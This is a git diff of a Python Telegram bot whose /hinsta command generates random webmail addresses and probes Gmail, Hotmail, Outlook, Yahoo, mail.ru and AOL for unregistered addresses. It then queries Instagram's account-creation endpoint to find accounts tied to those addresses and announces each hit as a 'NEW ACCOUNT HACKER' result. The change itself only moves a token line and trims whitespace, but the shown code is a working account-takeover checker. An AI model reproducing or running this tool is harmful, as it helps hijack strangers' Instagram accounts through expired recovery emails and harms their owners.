@@ -75,6 +75,7 @@ def start(message):
 	elif message.text == '/hinsta' or message.text == '/hinsta@CH_IG_FB_TK_SNAP_BOT':
 		gm=0;ya=0;ot=0;ho=0;ao=0;mr=0;bad=0;hit=0;ins=0
 		while True:
+			tk = secrets.token_hex(8)*2
 			sets= ['@gmail.com','@aol.com','@yahoo.com','@mail.ru','@hotmail.com','@outlook.com']
 			domin = random.choice(sets)
 			r = '1234567890'
@@ -99,7 +100,7 @@ def start(message):
 				response = requests.post(url, data=data, headers=headers)
 				if (',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[]') in response.text:
 					gm+=1
-					tk = secrets.token_hex(8)*2
+					
 					emll = urllib.parse.quote(email)
 					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
 					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
@@ -118,8 +119,6 @@ def start(message):
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
 						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
-					
-
 			elif (email.split('@')[1])=='hotmail.com':
 				email = email
 				user = user
@@ -129,7 +128,7 @@ def start(message):
 				response = requests.post(url, data=data, headers=headers)
 				if ("Neither") in response.text:
 					ho+=1
-					tk = secrets.token_hex(8)*2
+					
 					emll = urllib.parse.quote(email)
 					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
 					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
@@ -148,8 +147,6 @@ def start(message):
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
 						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
-					
-
 			elif (email.split('@')[1])=='outlook.com':
 				email = email
 				user = user
@@ -159,7 +156,7 @@ def start(message):
 				response = requests.post(url, data=data, headers=headers)
 				if ("Neither") in response.text:
 					ot+=1
-					tk = secrets.token_hex(8)*2
+					
 					emll = urllib.parse.quote(email)
 					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
 					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
@@ -178,8 +175,6 @@ def start(message):
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
 						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
-					
-
 			elif (email.split('@')[1])=='yahoo.com':
 				email = email
 				user = user
@@ -189,7 +184,7 @@ def start(message):
 				response = requests.post(url, data=data, headers=headers)
 				if ('"error":"messages.INVALID_USERNAME"') in response.text:
 					ya+=1
-					tk = secrets.token_hex(8)*2
+					
 					emll = urllib.parse.quote(email)
 					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
 					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
@@ -208,8 +203,6 @@ def start(message):
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
 						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
-					
-
 			elif (email.split('@')[1])=='mail.ru':
 				email = email
 				user = user
@@ -219,7 +212,6 @@ def start(message):
 				response = requests.post(url, data=data, headers=headers)
 				if str(response.json()['body']['exists']) == 'False':
 					mr+=1
-					tk = secrets.token_hex(8)*2
 					emll = urllib.parse.quote(email)
 					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
 					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
@@ -238,8 +230,6 @@ def start(message):
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
 						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
-					
- 
 			elif (email.split('@')[1])=='aol.com':
 				email = email
 				user = user
@@ -251,7 +241,7 @@ def start(message):
 					bad+=1
 				else:
 					ya+=1
-					tk = secrets.token_hex(8)*2
+					
 					emll = urllib.parse.quote(email)
 					url = "https://www.instagram.com/accounts/web_create_ajax/attempt/"
 					data= f"email={emll}&username=&first_name=&opt_into_one_tap=false"
@@ -269,9 +259,7 @@ def start(message):
 						followers = url.split('"followers" :"<li class="list__item">')[1].split('</li>"')[0]
 						following = url.split('"following" :"<li class="list__item">')[1].split('</li>"}')[0]
 						hacker =" https://t.me/z9oon/13"
-						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")
-					
-						
+						bot.send_video(message.chat.id,hacker,caption= "**NEW ACCOUNT HACKER BY MOHAMMED**\n**EMAIL : **`{}`\n**USERNAME : ** `{}`\n**NAME : **`{}`\n**BIO : **`{}`\n**POST : **`{}`\n**FOLLOWERS : **`{}`\n**FOLLOWING : **`{}`\n**DEVLOPER : **{}".format(email,username,name,bio,post,followers,following,copyright),parse_mode = "markdown")					
 #	elif message.text == '/cinsta' or message.text == '/cinsta@CH_IG_FB_TK_SNAP_BOT':
 
 #	elif message.text == '/uinsta' or message.text == '/uinsta@CH_IG_FB_TK_SNAP_BOT':
